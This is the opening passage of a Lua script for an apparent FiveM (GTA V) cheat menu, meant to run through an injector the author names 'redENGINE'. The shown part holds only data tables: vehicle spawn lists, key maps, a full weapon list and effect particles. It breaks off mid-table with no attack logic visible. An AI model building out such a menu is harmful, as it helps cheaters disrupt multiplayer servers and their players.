Citizen.CreateThread(function()

    -- Hello, if you are someone that successfully got my menu out of redENGINE, before you gonna leak it to public, please dm me on discord Kubca#1337 we can make a deal. 
   local ci_ = Citizen  
   local sum = {
       notifiindex = 0,
       notifications = {},
       freecamparticles = {'core', 'ent_sht_petrol_fire'},
       playerparticles = {'core', 'ent_sht_petrol_fire'},
       destroyerparticles = {'core', 'ent_sht_petrol_fire'},
       glifecarlist = {
           {spawn = "deluxo", name = "Deluxo"},
           {spawn = "buzzard2", name = "Buzzard"},      
           {spawn = "maverick", name = "Maverick"},
           {spawn = "thruster", name = "Thruster"},
           {spawn = "nightshark", name = "Nightshark"},
           {spawn = "vigilante", name = "Vigilante"},
           {spawn = "scarab", name = "Apocalypse Scarab"},
           {spawn = "ztype", name = "Z-Type"},
       },
       vehaddonslist = {
           {spawn = "divo", name = "Bugatti Divo"}, {spawn = "latmc", name = "??"},
           {spawn = "camaro", name = "Chevrolet Camaro"},
           {spawn = "brabus500", name = "Mercedes Brabus 500"}, {spawn = "brabus550", name = "Mercedes Brabus 550"},
           {spawn = "g500", name = "Mercedes G500"}, {spawn = "h2carb", name = "Ninja H2"},
           {spawn = "teslax", name = "Tesla Model X"}, {spawn = "BENTAYGA17", name = "Bentley Bentayga"},
           {spawn = "yz450f", name = "Yamaha YZ450F"}, {spawn = "tmsm", name = "TM450 Supermoto"},
           {spawn = "rmz250", name = "Suzuki RMZ 250"}, {spawn = "WRAITH", name = "Rolls Royce Wraith"},
           {spawn = "URUS", name = "Lamborghini Urus"}, {spawn = "demon", name = "Dodge Demon"},
           {spawn = "BMWI8", name = "BMW i8"}, {spawn = "rrst", name = "Range Rover Vogue"},
           {spawn = "M6F13", name = "BMW M6"}, {spawn = "CHARGER", name = "Dodge Charger"},
           {spawn = "19gt500", name = "Ford Mustang Shelby"}, {spawn = "exor", name = "Camaro Exorcist"},
           {spawn = "SVJ", name = "Lamborghini Aventador SVJ"}, {spawn = "demonhawk", name = "Demonhawk"},
           {spawn = "911", name = "Porsche 911 Turbo"}, {spawn = "GT2RS", name = "Porsche GT2"},
           {spawn = "CONTSS18", name = "Bentley Continental GT"}, {spawn = "FERRARI812", name = "Ferrari 812"},
           {spawn = "BENTAYGA17", name = "Bentley Bentayga"}, {spawn = "458spc", name = "Ferrari 458"},
           {spawn = "63LB", name = "Mercedes CLS 63"}, {spawn = "c63scoupe", name = "Mercedes C63s"},
           {spawn = "MVISIONGT", name = "Mercedes-Benz AMG Vision GT"}, {spawn = "sv", name = "Lamborghini Aventador SV"},
           {spawn = "GTRC", name = "Mercedes-Benz AMG GT-R"}, {spawn = "SENNA", name = "McLaren Senna"},
           {spawn = "C7", name = "Corvette C7"}, {spawn = "LWGTR", name = "Liberty Walk GTR"},
           {spawn = "AR8LB", name = "Audi R8"}, {spawn = "r8ppi", name = "Audi R8"},
           {spawn = "g63mg", name = "G63 Mansory"},
           {spawn = "scaldarsi", name = "Maybach Emperor"}, {spawn = "bm8c", name = "BMW M8 CoupÃ©"},
           {spawn = "jes", name = "Koenigsegg Jesko"}, {spawn = "cczl", name = "Camaro on 32s"},
           {spawn = "c8", name = "Corvette C8"}, {spawn = "bentaygam", name = "Bentayga Mansory"},
           {spawn = "mlmansory", name = "Levante Mansory"}, {spawn = "dawn", name = "Mansory RR Dawn"},
           {spawn = "ursa", name = "Porsche Macan"}, {spawn = "gle63c", name = "GLE Amg"},
           {spawn = "sr650fly", name = "Sea Ray 650"}, {spawn = "BMWM8", name = "BMW M8"},
           {spawn = "19S650", name = "Maybach S650"}, {spawn = "amggtsmansory", name = "AMG GTS Mansory"},
           {spawn = "G63AMG6x6", name = "Brabus 6x6"}, {spawn = "qx56", name = "Infinity QX56"},
           {spawn = "vantage", name = "Aston Martin Vantage"}, {spawn = "svr16", name = "Range Rover Sport"},
           {spawn = "x6m", name = "BMW X6M"}, {spawn = "a8lw12", name = "Audi A8L"},
           {spawn = "corvetteZR1", name = "Corvette ZR1"}, {spawn = "720stc", name = "McLaren 720s"},
           {spawn = "TMODEL", name = "Tesla Model3"}, {spawn = "kiagt", name = "Kia Stinger"},
           {spawn = "rs5r", name = "Audi RS5R"}, {spawn = "R8v10", name = "Audi R8 V10"},
           {spawn = "cayenne", name = "Porsche Cayenne Turbo"}, {spawn = "NISALTIMA", name = "Nissan Altima"},
           {spawn = "TR22", name = "Tesla Roadster"}, {spawn = "Mb400", name = "Mercedes EQC400"},
           {spawn = "2020silv", name = "2020 Chevrolet Silverado"}, {spawn = "foxrossa", name = "Ferrari 512 TR 1991"},
           {spawn = "M3E30", name = "BMW E30 M3"}, {spawn = "foxharley2", name = "Harley Davidson"},
           {spawn = "foxharley1", name = "Harley Davidson Slimbob"}, {spawn = "denalihd", name = "Denali"},
           {spawn = "fox600lt", name = "Mclaren 600LT 2020"}, {spawn = "m6x6", name = "Mercedes 6X6 Geries Brabus AMG"},
           {spawn = "foxrover1", name = "Range Rover Evoque 2016"}, {spawn = "tonkat", name = "Toyota Tonka Hilux"},
           {spawn = "kuga", name = "Ford Kuga"}, {spawn = "silvias15", name = "Nissan Silvia S-15"},
           {spawn = "rx7rb", name = "Mazda RX7"}, {spawn = "fto", name = "Mitsubishi FTO"},
           {spawn = "mr2sw20", name = "Toyota MR-2 GT"}, {spawn = "eclipsegt06", name = "Mitsubishi Eclipse GT"},
           {spawn = "SkylineGTR", name = "SKYLINE GTR R34"}, {spawn = "terzo", name = "Lamborghini Terzo"},
           {spawn = "CAN", name = "Can AM"}, {spawn = "2020ss", name = "2020 Chevrolet Camaro"},
           {spawn = "rmodveneno", name = "Lamborghini Veneno"}, {spawn = "gurkha", name = "Gang Insurgent"},
           {spawn = "p1", name = "2020 McLaren P1"}, {spawn = "viper", name = "Viper SRT"},
           {spawn = "TypeR17", name = "Civic TypeR"}, {spawn = "sc18", name = "Lamborghini SC18"},
           {spawn = "XJ", name = "Jaguar XJ"}, {spawn = "lp700", name = "Lamborghini LP700"},
           {spawn = "Huracan", name = "Lamborghini Huracan"}, {spawn = "TESLAPD", name = "Tesla Model"},
           {spawn = "S63W222", name = "Mercedes S63"}, {spawn = "foxct", name = "Tesla Cyber Truck"},
           {spawn = "foxsterrato", name = "Lamborghini Sterrato 2020"}, {spawn = "foxsian", name = "Lamborghini Sian"},
           {spawn = "foxevo", name = "Huracan Evo"}, {spawn = "foxsupra", name = "Toyota Supra GR 2020"},
           {spawn = "h3", name = "Hummer 3"}, {spawn = "foxleggera", name = "Aston Martin  DBS"},
           {spawn = "rmodi8mlb", name = "BMW i8 Liberty Walk"}, {spawn = "CORVETTE", name = "C7 Widebody"},
           {spawn = "slingshot", name = "slingshot"}, {spawn = "f8rarri", name = "Ferrari F8"},
           {spawn = "forgiato", name = "Hellcat Charger Widebody"}, {spawn = "ts1", name = "Zenvo TS1"},
           {spawn = "jeepg", name = "Jeep Gladiator"}, {spawn = "GRANDGT18", name = "Porsche Panamera Sport"},
           {spawn = "2008f150", name = "2008 F150"}, {spawn = "lccreaper", name = "LCC Reaper"},
           {spawn = "REMOWER", name = "LawnMower"}, {spawn = "EVO10", name = "Lancer EVO"}, 
           {spawn = "vip8", name = "Dodge Viper"}, {spawn = "ELLCHARG", name = "Ellie SuperCharged"},
           {spawn = "G770", name = "Lumma CLR G770"},{spawn = "IMPALASS2", name = "Chevrolet Impala 1964"}, 
           {spawn = "fox720s", name = "Mclaren 720s"}, {spawn = "CHIRON", name = "Police Chiron"},
           {spawn = "polp1", name = "Police Mclaren P1"}, {spawn = "AVENTADOR", name = "Police Aventador"},
           {spawn = "Custom", name = "Police R1 Bike"}, {spawn = "CENTENARIO", name = "Police LP770"},
           {spawn = "Mustang", name = "Police Mustang"}, {spawn = "rmodamgc63", name = "AMG C63"},
           {spawn = "audipd", name = "Police Audi"}, {spawn = "MRAP", name = "Police MRAP"},
           {spawn = "CHIRON17", name = "Bugatti Chiron"}, {spawn = "can", name = "Can AM"},
           {spawn = "rmodmustang", name = "Mustang"}, {spawn = "beck", name = "F1 Type Car"},
           {spawn = "bugatti", name = "Bugatti Veyron"}, {spawn = "foxezri", name = "Ferrari Xezri"},
           {spawn = "exgtr", name = "EX GTR"}, {spawn = "f824slw", name = "Dandogg Car"},
           {spawn = "rculi", name = "Rolls Royce Cullinan"}, {spawn = "raptor150", name = "Raptor F-150"},
           {spawn = "rs6c8", name = "Audi RS6"}, {spawn = "ren_clio_5", name = "Renalt Clio V"},
           {spawn = "caprice13", name = "Chevrolet Caprice"}, {spawn = "elantra07", name = "Hyundai Elantra"},
           {spawn = "familiac", name = "Mazda Familia"}, {spawn = "trhawk", name = "Jeep TrackHawk"},
           {spawn = "ramlh20", name = "Dodge Ram Longhorn"}, {spawn = "mach1", name = "Ford Mustang Mach 1"},
           {spawn = "h1", name = "HUMMER H1"}, {spawn = "h2", name = "HUMMER H2"},
           {spawn = "humvee", name = "humvee"}, {spawn = "hummer", name = "HUMMER H1"},
           {spawn = "cbr1000rrr", name = "Honda CBR1000RR"}, {spawn = "rmodmi8lb", name = "Liberty Walk i8"},
           {spawn = "Skyline", name = "Nissan Skyline GTR"}, {spawn = "boss302", name = "Ford Mustang Boss 302"},
           {spawn = "exc530", name = "KTM EXC 530"}, {spawn = '20x5m', name = "BMW X5M"},
           {spawn = 'thekart', name = 'Go Kart'}, {spawn = 'rmodm4', name = 'BMW M4'},
           {spawn = 'rmodx6', name = 'BMW X6'}, {spawn = 'x5m', name = 'BMW X5M'},
           {spawn = 'bcps', name = 'Bugatti Chrion'}, {spawn = 'bdivo', name = 'Bugatti Divo'},
           {spawn = 'aperta', name = 'Ferrari Laferrari Aperta'}, {spawn = 'f40', name = 'Ferrari F40'},
           {spawn = 'eltransit', name = 'Ford Transit'}, {spawn = 'explorer20', name = 'Ford Explorer'},
           {spawn = 'mclarengt', name = 'McLaren GT'}, {spawn = '720s', name = 'McLaren 720s'},
           {spawn = 'amggtc', name = 'Mercedes AMG GTC'}, {spawn = 'arrow', name = 'Mercedes Arrow'},
           {spawn = 'brabus850', name = 'Brabus 850'}, {spawn = 'e63amg', name = 'Mercedes E63 AMG'},
           {spawn = 'nissantitan17', name = 'Nissan Titan'}, {spawn = 'cayenneturbo', name = 'Porche Cayenne Turbo'},
           {spawn = 'golfgti', name = 'Volkswagon Golf GTI'}, {spawn = 'q8prior', name = 'Audi Q8'},
           {spawn = 'rs666', name = 'Audi RS6'}, {spawn = '190e',  name = 'Mercedes 190E'},
           {spawn = 'golfmk7', name = 'Volkswagon Golf Mk7'}, {spawn = 'rmodjeep', name = 'Jeep Wrangler?'},
           {spawn = 'raid', name = 'Doge Challenger Raid'}, {spawn = 'bentaygast', name = 'Bently Bentayga'},
           {spawn = 'st', name = 'Ford Feista'}, {spawn = "gtr", name = "Nissan GTR r35"},
           {spawn = "19dbs", name = "2019 Aston Martin DBS"}, {spawn = "16challenger", name = "2016 challenger"},
           {spawn = "450crf", name = "Honda 450CRF"}, {spawn = "911", name = "Porshe 911"},
           {spawn = "amggtsprior", name = "Mercedes AMG GTS Prior"}, {spawn = "lb750sv", name = "Lamborghini Aventador LB750SV"},
           {spawn = "rculi", name = "Rolls Royce Cullian"}, {spawn = "raptor150", name = "Ford Raptor"},
           {spawn = "ren_clio_5", name = "Renault Clio"}, {spawn = "caprice13", name = "Chevrolet Caprice"},
           {spawn = "elantra07", name = "20017 Hyundai Elantra"}, {spawn = "familiac", name = "Mazda Familia"},
           {spawn = "lp770", name = "Lamborghini Centenario"}, {spawn = "brz", name = "Subaru Brz"},
           {spawn = "agera", name = "Koenigsegg Agera"}, {spawn = "cbr1000", name = "Honda CBR 1000RR"},
           {spawn = "g500", name = "Mercedes G500"}, {spawn = "h2carb", name = "2017 Kawasaki H2 Carbon"},
           {spawn = "ar8lb", name = "Liberty Walk BMW I8"}, {spawn = "g63mg", name = "Mercedes AMG G63"},
           {spawn = "scaldarsi", name = "Scaldarsi Emperor"}, {spawn = "db11", name = "Aston Martin DB11"},
           {spawn = "f82", name = "BMW M4"}, {spawn = "g63", name = "Mercedes G63"},
           {spawn = "gt63", name = "Mercedes GT 63"}, {spawn = "rmodamgc63", name = "Mercedes AMG c63"},
           {spawn = "rmodx6", name = "BMW X6"}, {spawn = "x5m", name = "BMW X5"},
           {spawn = "rs666", name = "Widebody Audi RS6"}, {spawn = "golfmk7", name = "VW Golf MK7"},
           {spawn = "rmodmustang", name = "Ford Mustang"}, {spawn = "rmodrs6", name = "Audi rs6"},
           {spawn = "golfmk7", name = "VW Golf MK7"}, {spawn = "corvettezr1", name = "Corvette C7 ZR1"},
           {spawn = "bmwm8", name = "BMW M8"}, {spawn = "vantage", name = "Aston Martin Vantage"},
           {spawn = "04acuratsx", name = "2004 Acura STX"}, {spawn = "180sx", name = "Nissan 180sx"},
           {spawn = "18performante", name = "2018 Lamborghini Performante"}, {spawn = "95stang", name = "1995 Ford Mustang"},
           {spawn = "countach", name = "Lamborghini Countach"}, {spawn = "cyrus", name = "Aston Martin Cyrus"},
           {spawn = "czr2", name = "Chevrolet Colorado ZR2"}, {spawn = "dbs2009", name = "2009 Aston Martin DBS"},
           {spawn = "f812", name = "Ferrari F812 Superfast"}, {spawn = "fairlane66", name = "1966 Ford Fairlane"}, 
           {spawn = "cesc21", name = "Cadillac Escalade"}, {spawn = "aimgainnsx", name = "AimGain's Acura NSX"},
           {spawn = "745le", name = "BMW 745le M Sport"}, {spawn = "gmt900escal", name = "GMT Escalade"},
           {spawn = "e30t", name = "BMW E3 e30t"}, {spawn = "m2f22", name = "BMW M2"},
           {spawn = "rmodm4gts", name = "BMW M4 GTS"}, {spawn = "rmodm8gte", name = "BMW M8 GTE"},
           {spawn = "69charger", name = "1969 Dodge Charger"}, {spawn = "rmodchiron300", name = "Bugatti Chiron"},
           {spawn = "rmodbugatti", name = "Bugatti Veyron"}, {spawn = "rmodzl1", name = "Camaro ZL1"},
           {spawn = "velociraptor", name = "Ford velociraptor"}, {spawn = "m82020", name = "2020 BMW M8"},
           {spawn = "golfmk6", name = "VW Golf mk6"}, {spawn = "718caymans", name = "Porshe Cayman S 718"},
           {spawn = "sq72016", name = "Audi SQ7 2016"}, {spawn = "bbentayga", name = "Bentley Bentayga"},
           {spawn = "cgts", name = "Bentley Continental GT"}, {spawn = "e34", name = "BMW E34"},
           {spawn = "m3e92", name = "BMW M3 E92"}, {spawn = "m3f80", name = "BMW M3 F80"},
           {spawn = "m4f82", name = "BMW M4 F82"}, {spawn = "giulia", name = "Alfa Romeo Giulia"},
           {spawn = "stelvio2017", name = "Alfa Romeo Stelvio"}, {spawn = "ast", name = "Aston Martin Vanquish"},
           {spawn = "rs7", name = "Audi RS7"}, {spawn = "a6", name = "Audi RS6"},
           {spawn = "tailgate", name = "Audi A8"}, {spawn = "sq5-2017", name = "Audi SQ5"},
           {spawn = "q820", name = "Audi 18"}, {spawn = "r8ppis", name = "Audi R8"},
           {spawn = "rs3", name = "Audi RS3"}, {spawn = "rs5", name = "Audi RS5"},
           {spawn = "rs6", name = "Audi RS6"}, {spawn = "sq72016", name = "Audi SQ7"},
           {spawn = "continental", name = "Bentley Continental"}, {spawn = "750il", name = "BMW 750Il"}, 
           {spawn = "m5", name = "BMW M5F90"}, {spawn = "bmwi8", name = "BMW I8"},
           {spawn = "lumma750", name = "BMW Lumma"}, {spawn = "430", name = "Ferrari 430"},
           {spawn = "M2", name = "BMW M2"}, {spawn = "godzcanam", name = "Buggy Canam"},
           {spawn = "ferrari812", name = "Ferrari 812"}, {spawn = "californiat", name = "Ferrari Californiat"},
           {spawn = "18performan", name = "Lamborghini Performante"}, {spawn = "asterope", name = "Lamborghini Urus"},
           {spawn = "P1", name = "McLaren P1"}, {spawn = "amggtr", name = "Mercedes-Benz AMG GTR"},
           {spawn = "brabus 700", name = "Mercedes-Benz Brabus 700"}, {spawn = "cls2015", name = "Mercedes-Benz CLS 2015"},
           {spawn = "e400", name = "Mercedes-Benz E400"}, {spawn = "s500w222", name = "Mercedes-Benz S500"},
           {spawn = "911turbos", name = "Porsche 911 Turbo S"}, {spawn = "caynne s 2", name = "Porsche Caynne"},
           {spawn = "pgt3", name = "Porsche 911"}, {spawn = "pm19", name = "Porsche Macan"},
           {spawn = "laferrari a", name = "Ferrari Aperta"}, {spawn = "projectone", name = "Mercedes-Benz Project One"},
           {spawn = "rmodmi8lb", name = "BMW i8 RMOD"}, {spawn = "rmodmustanggt", name = "Mustang-GT RMOD"},
   
       },
       checkboxes = {},
       TR = {},
       m = {},
       Microsoftkeys = {
   
           ["MOUSE1"] = 0x01,
           ["MOUSE2"] = 0x02,
           ["CONTROL BREAK"] = 0x03,
           ["MOUSE3"] = 0x04,
           ["MOUSE4"] = 0x05,
           ["MOUSE5"] = 0x06,
           ["UNDEFINED"] = 0x07,
           ["BACKSPACE"] = 0x08,
           ["TAB"] = 0x09,
           ["RESERVED"] = 0x0A,
           ["CLEAR"] = 0x0C,
           ["ENTER"] = 0x0D,
           ["SHIFT"] = 0x10,
           ["CTRL"] = 0x11,
           ["ALT"] = 0x12,
           ["PAUSE"] = 0x13,
           ["CAPSLOCK"] = 0x14,
           ["IME-KANA"] = 0x15,
           ["IME-Hanguel"] = 0x15,
           ["IME-ON"] = 0x16,
           ["IME-JUNJA"] = 0x17,
           ["IME-FINAL"] = 0x18,
           ["IME-HANJA"] = 0x19,
           ["IME-OFF"] = 0x1A,
           ["ESC"] = 0x1B,
           ["IME-CONVERT"] = 0x1C,
           ["IME-NONCONVERT"] = 0x1D,
           ["IME-ACCEPT"] = 0x1E,
           ["IME-MODECHANGEREQ"] = 0x1F,
           ["SPACEBAR"] = 0x20,
           ["PAGE-UP"] = 0x21,
           ["PAGE-DOWN"] = 0x22,
           ["END"] = 0x23,
           ["HOME"] = 0x24,
           ["LEFT-ARROW"] = 0x25,
           ["UP-ARROW"] = 0x26,
           ["RIGHT-ARROW"] = 0x27,
           ["DOWN-ARROW"] = 0x28,
           ["SELECT"] = 0x29,
           ["PRINT"] = 0x2A,
           ["EXECUTE"] = 0x2B,
           ["PRTSCN"] = 0x2C,
           ["INSERT"] = 0x2D,
           ["DELETE"] = 0x2E,
           ["HELP"] = 0x2F,
           ["0"] = 0x30,
           ["1"] = 0x31,
           ["2"] = 0x32,
           ["3"] = 0x33,
           ["4"] = 0x34,
           ["5"] = 0x35,
           ["6"] = 0x36,
           ["7"] = 0x37,
           ["8"] = 0x38,
           ["9"] = 0x39,
           ["A"] = 0x41,
           ["B"] = 0x42,
           ["C"] = 0x43,
           ["D"] = 0x44,
           ["E"] = 0x45,
           ["F"] = 0x46,
           ["G"] = 0x47,
           ["H"] = 0x48,
           ["I"] = 0x49,
           ["J"] = 0x4A,
           ["K"] = 0x4B,
           ["L"] = 0x4C,
           ["M"] = 0x4D,
           ["N"] = 0x4E,
           ["O"] = 0x4F,
           ["P"] = 0x50,
           ["Q"] = 0x51,
           ["R"] = 0x52,
           ["S"] = 0x53,
           ["T"] = 0x54,
           ["U"] = 0x55,
           ["V"] = 0x56,
           ["W"] = 0x57,
           ["X"] = 0x58,
           ["Y"] = 0x59,
           ["Z"] = 0x5A,
           ["LEFT-WIN"] = 0x5B,
           ["RIGHT-WIN"] = 0x5C,
           ["APPLICATIONS"] = 0x5D,
           ["RESERVED"] = 0x5E,
           ["COMPUTER-SLEEP"] = 0x5F,
           ["N0"] = 0x60,
           ["N1"] = 0x61,
           ["N2"] = 0x62,
           ["N3"] = 0x63,
           ["N4"] = 0x64,
           ["N5"] = 0x65,
           ["N6"] = 0x66,
           ["N7"] = 0x67,
           ["N8"] = 0x68,
           ["N9"] = 0x69,
           ["MULTIPLY"] = 0x6A,
           ["ADD"] = 0x6B,
           ["SEPARATOR"] = 0x6C,
           ["SUBTRACT"] = 0x6D,
           ["DECIMAL"] = 0x6E,
           ["DIVIDE"] = 0x6F,
           ["F1"] = 0x70,
           ["F2"] = 0x71,
           ["F3"] = 0x72,
           ["F4"] = 0x73,
           ["F5"] = 0x74,
           ["F6"] = 0x75,
           ["F7"] = 0x76,
           ["F8"] = 0x77,
           ["F9"] = 0x78,
           ["F10"] = 0x79,
           ["F11"] = 0x7A,
           ["F12"] = 0x7B,
           ["F13"] = 0x7C,
           ["F14"] = 0x7D,
           ["F15"] = 0x7E,
           ["F16"] = 0x7F,
           ["F17"] = 0x80,
           ["F18"] = 0x81,
           ["F19"] = 0x82,
           ["F20"] = 0x83,
           ["F21"] = 0x84,
           ["F22"] = 0x85,
           ["F23"] = 0x86,
           ["F24"] = 0x87,
           ["NUMLOCK"] = 0x90,
           ["SCROLL"] = 0x91,
           ["LEFT-SHIFT"] = 0xA0,
           ["RIGHT-SHIFT"] = 0xA1,
           ["LEFT-CONTROL"] = 0xA2,
           ["RIGHT-CONTROL"] = 0xA3,
           ["LEFT-MENU"] = 0xA4,
           ["RIGHT-MENU"] = 0xA5,
           ["BROWSER-BACK"] = 0xA6,
           ["BROWSER-FORWARD"] = 0xA7,
           ["BROWSER-REFRESH"] = 0xA8,
           ["BROWSER-STOP"] = 0xA9,
           ["BROWSER-SEARCH"] = 0xAA,
           ["BROWSER-FAVORITES"] = 0xAB,
           ["BROWSER-START"] = 0xAC,
           ["VOLUME-MUTE"] = 0xAD,
           ["VOLUME-DOWN"] = 0xAE,
           ["VOLUME-UP"] = 0xAF,
           ["NEXT-TRACK"] = 0xB0,
           ["PREVIOUS-TRACK"] = 0xB1,
           ["STOP-MEDIA"] = 0xB2,
           ["PLAY-MEDIA"] = 0xB3,
           ["START-MAIL"] = 0xB4,
           ["SELECT-MEDIA"] = 0xB5,
       },
       keys = { 
           ["dick"] = 359, [""]=322,[""]=288,[""]=289,[""]=170,[""]=166,[""]=167,[""]=168,[""]=169,[""]=56,[""]=57,[""]=243,["1"]=157,["2"]=158,["3"]=160,["4"]=164,["5"]=165,["6"]=159,["7"]=161,["8"]=162,["9"]=163,["-"]=84,["="]=83,[""]=177,[""]=37,["Q"]=44,["W"]=32,["E"]=38,["R"]=45,["T"]=245,["Y"]=246,["U"]=303,["P"]=199,["["]=39,["]"]=40,[""]=18,["CAPS"]=137,["A"]=34,["S"]=8,["D"]=9,["F"]=23,["G"]=47,["H"]=74,["K"]=311,["L"]=182,[""]=21,["Z"]=20,["X"]=73,["C"]=26,["V"]=0,["B"]=29,["N"]=249,["M"]=244,[","]=82,["."]=81,[""]=36,[""]=19,[""]=22,[""]=70,[""]=213,[""]=10,["J"]=11,["O"]=178,["I"]=121,[""]=174,[""]=175,[""]=172,[""]=173,[""]=201,[""]=15,[""]=14,[""]=61,[""]=108,[""]=60,[""]=107,[""]=96,[""]=97,[""]=117,[""]=118,[""]=24,[""]=25,[""]=348 
       },
       
       combo = {
           [1] = 1,
           [2] = 1,
           [3] = 1,
           [4] = 1,
           [5] = 1,
           [6] = 1,
           [7] = 1,
           [8] = 1,
           [9] = 1,
           [10] = 1,
           [11] = 1,
           [12] = 1,
           [13] = 1,
           [14] = 1,
           [15] = 1,
           [16] = 1,
           [17] = 1,
           [18] = 1,
           [19] = 1,
           [20] = 1,
           [21] = 1,
           [22] = 1,
           [23] = 1,
           [24] = 1,
           [25] = 1,
           [26] = 1,
           [27] = 1,
           [28] = 1,
           [29] = 1,
   
       }, 
       bulletImpact = {},
       hitsound = {},
       ALLWEAPONS = {"weapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_flashlight","weapon_unarmed","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_knuckle","weapon_knife","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench","weapon_battleaxe","weapon_poolcue","weapon_stone_hatchet","weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_snspistol_mk2","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun","weapon_marksmanpistol","weapon_revolver","weapon_revolver_mk2","weapon_doubleaction","weapon_raypistol","weapon_ceramicpistol","weapon_navyrevolver","weapon_gadgetpistol","weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_combatpdw","weapon_machinepistol","weapon_minismg","weapon_raycarbine","weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_musket","weapon_heavyshotgun","weapon_dbshotgun","weapon_autoshotgun","weapon_combatshotgun","weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_specialcarbine_mk2","weapon_bullpuprifle","weapon_bullpuprifle_mk2","weapon_compactrifle","weapon_militaryrifle","weapon_mg","weapon_combatmg","weapon_combatmg_mk2","weapon_gusenberg","weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2","weapon_rpg","weapon_grenadelauncher","weapon_grenadelauncher_smoke","weapon_minigun","weapon_firework","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher","weapon_rayminigun","weapon_grenade","weapon_bzgas","weapon_molotov","weapon_stickybomb","weapon_proxmine","weapon_snowball","weapon_pipebomb","weapon_ball","weapon_smokegrenade","weapon_flare","weapon_petrolcan","weapon_fireextinguisher","weapon_hazardcan"},  
       fuckingboat = {'Dinghy', 'Dinghy2', 'Dinghy3', 'Dingh4', 'Jetmax', 'Marquis', 'Seashark', 'Seashark2', 'Seashark3', 'Speeder', 'Speeder2', 'Squalo', 'Submersible', 'Submersible2', 'Suntrap', 'Toro', 'Toro2', 'Tropic', 'Tropic2', 'Tug'},
       fuckingcommercial = {'Benson', 'Biff', 'Cerberus', 'Cerberus2', 'Cerberus3', 'Hauler', 'Hauler2', 'Mule', 'Mule2', 'Mule3', 'Mule4', 'Packer', 'Phantom', 'Phantom2', 'Phantom3', 'Pounder', 'Pounder2', 'Stockade', 'Stockade3', 'Terbyte'},
       fuckingcompacts = {'Blista', 'Blista2', 'Blista3', 'Brioso', 'Dilettante', 'Dilettante2', 'Issi2', 'Issi3', 'issi4', 'Iss5', 'issi6', 'Panto', 'Prarire', 'Rhapsody'},
       fuckingcoupes = {'CogCabrio', 'Exemplar', 'F620', 'Felon', 'Felon2', 'Jackal', 'Oracle', 'Oracle2', 'Sentinel', 'Sentinel2', 'Windsor', 'Windsor2', 'Zion', 'Zion2'},
       fuckingbikes = {'Bmx', 'Cruiser', 'Fixter', 'Scorcher', 'Tribike', 'Tribike2', 'tribike3'},
       fuckinemergency = {'ambulance', 'FBI', 'FBI2', 'FireTruk', 'PBus', 'police', 'Police2', 'Police3', 'Police4', 'PoliceOld1', 'PoliceOld2', 'PoliceT', 'Policeb', 'Polmav', 'Pranger', 'Predator', 'Riot', 'Riot2', 'Sheriff', 'Sheriff2'},
       fuckingheli = {'Akula', 'Annihilator', 'Buzzard', 'Buzzard2', 'Cargobob', 'Cargobob2', 'Cargobob3', 'Cargobob4', 'Frogger', 'Frogger2', 'Havok', 'Hunter', 'Maverick', 'Savage', 'Seasparrow', 'Skylift', 'Supervolito', 'Supervolito2', 'Swift', 'Swift2', 'Valkyrie', 'Valkyrie2', 'Volatus'},
       fuckingindu = {'Bulldozer', 'Cutter', 'Dump', 'Flatbed', 'Guardian', 'Handler', 'Mixer', 'Mixer2', 'Rubble', 'Tiptruck', 'Tiptruck2'},
       fuckingmili = {'APC', 'Barracks', 'Barracks2', 'Barracks3', 'Barrage', 'Chernobog', 'Crusader', 'Halftrack', 'Khanjali', 'Rhino', 'Scarab', 'Scarab2', 'Scarab3', 'Thruster', 'Trailersmall2'},
       fuckingmoto = {'Akuma', 'Avarus', 'Bagger', 'Bati2', 'Bati', 'BF400', 'Blazer4', 'CarbonRS', 'Chimera', 'Cliffhanger', 'Daemon', 'Daemon2', 'Defiler', 'Deathbike', 'Deathbike2', 'Deathbike3', 'Diablous', 'Diablous2', 'Double', 'Enduro', 'esskey', 'Faggio2', 'Faggio3', 'Faggio', 'Fcr2', 'fcr', 'gargoyle', 'hakuchou2', 'hakuchou', 'hexer', 'innovation', 'Lectro', 'Manchez', 'Nemesis', 'Nightblade', 'Oppressor', 'Oppressor2', 'PCJ', 'Ratbike', 'Ruffian', 'Sanchez2', 'Sanchez', 'Sanctus', 'Shotaro', 'Sovereign', 'Thrust', 'Vader', 'Vindicator', 'Vortex', 'Wolfsbane', 'zombiea', 'zombieb'},
       fuckingmuscle = {'Blade', 'Buccaneer', 'Buccaneer2', 'Chino', 'Chino2', 'clique', 'Deviant', 'Dominator', 'Dominator2', 'Dominator3', 'Dominator4', 'Dominator5', 'Dominator6', 'Dukes', 'Dukes2', 'Ellie', 'Faction', 'faction2', 'faction3', 'Gauntlet', 'Gauntlet2', 'Hermes', 'Hotknife', 'Hustler', 'Impaler', 'Impaler2', 'Impaler3', 'Impaler4', 'Imperator', 'Imperator2', 'Imperator3', 'Lurcher', 'Moonbeam', 'Moonbeam2', 'Nightshade', 'Phoenix', 'Picador', 'RatLoader', 'RatLoader2', 'Ruiner', 'Ruiner2', 'Ruiner3', 'SabreGT', 'SabreGT2', 'Sadler2', 'Slamvan', 'Slamvan2', 'Slamvan3', 'Slamvan4', 'Slamvan5', 'Slamvan6', 'Stalion', 'Stalion2', 'Tampa', 'Tampa3', 'Tulip', 'Vamos,', 'Vigero', 'Virgo', 'Virgo2', 'Virgo3', 'Voodoo', 'Voodoo2', 'Yosemite'},
